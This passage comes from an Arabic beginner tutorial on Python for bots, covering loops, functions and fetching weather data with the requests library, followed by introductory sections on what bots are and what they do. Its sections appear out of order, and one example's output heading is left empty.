    if رسالة == "خروج":
        print("إلى اللقاء!")
        يعمل = False
    else:
        print("استلمت:", رسالة)

هذا بالضبط كيف تعمل بوتات الدردشة — حلقة while لا تتوقف وتستقبل رسائل باستمرار.

خامساً: الدوال — علبة أوامر تستخدمها متى تريد

الدالة هي مجموعة أوامر تعطيها اسماً، وتستدعيها متى تريد بدل ما تكتب نفس الأوامر مرة أخرى. تكتبها مرة واحدة وتستخدمها ألف مرة.

Python
# تعريف الدالة — نكتبها مرة واحدة
def رد_على_مستخدم(اسم, رسالة):
    if رسالة == "مرحبا":
        return "أهلاً " + اسم + "! كيف أساعدك؟"
    elif رسالة == "وداع":
        return "إلى اللقاء " + اسم + "!"
    else:
        return "لم أفهم طلبك يا " + اسم

# استدعاء الدالة — نستخدمها متى نريد
رد1 = رد_على_مستخدم("أحمد", "مرحبا")
رد2 = رد_على_مستخدم("فاطمة", "وداع")

print(رد1)
print(رد2)
// النتيجة
أهلاً أحمد! كيف أساعدك؟
إلى اللقاء فاطمة!

def تعني "عرّف دالة جديدة". return تعني "أرجع هذه القيمة كنتيجة". في البوت الحقيقي، كل وظيفة تصبح دالة: دالة للرد، دالة لجلب الطقس، دالة لحفظ المستخدم.

سادساً: كيف يجلب البوت بيانات من API بـ Python؟

الآن نجمع درس API مع Python. في Python هناك مكتبة اسمها requests مهمتها الوحيدة إرسال طلبات HTTP. بسطرين فقط تستطيع التحدث مع أي API في العالم.

Python
# أولاً نستورد المكتبة
import requests

# نرسل طلب GET لـ API الطقس
رابط = "https://api.weather.com/v1/current?city=Nouakchott"
رد = requests.get(رابط)

# نحوّل الرد من JSON إلى بيانات Python
بيانات = رد.json()

# نستخرج درجة الحرارة
حرارة = بيانات["temperature"]
مدينة = بيانات["city"]

print("درجة الحرارة في", مدينة, "هي", حرارة, "درجة")
// النتيجة

أولاً: ما هو البوت؟

البوت برنامج يعمل تلقائياً بدون تدخل بشري. فكر فيه كموظف لا يتعب ولا ينام ولا يأخذ إجازة، يرد على العملاء في ثوانٍ، يُرسل التنبيهات في الوقت المحدد، ويُنفّذ المهام المتكررة بدقة كاملة.

أمثلة تراها كل يوم دون أن تعلم:

عندما تطلب من متجر إلكتروني وتجد رسالة تأكيد فورية في ثوانٍ، هذا بوت. عندما يُرسل البنك تنبيهاً فورياً بكل معاملة، هذا بوت. عندما تكتب لخدمة عملاء في منتصف الليل وتجد رداً فورياً، هذا بوت.

ثانياً: ما الذي يمكن للبوت فعله لك؟

إرسال عروض ومنشورات في أوقات محددة تلقائياً.

تذكير العملاء بمواعيدهم أو بانتهاء عروض.

جمع آراء العملاء وتنظيمها في جدول.
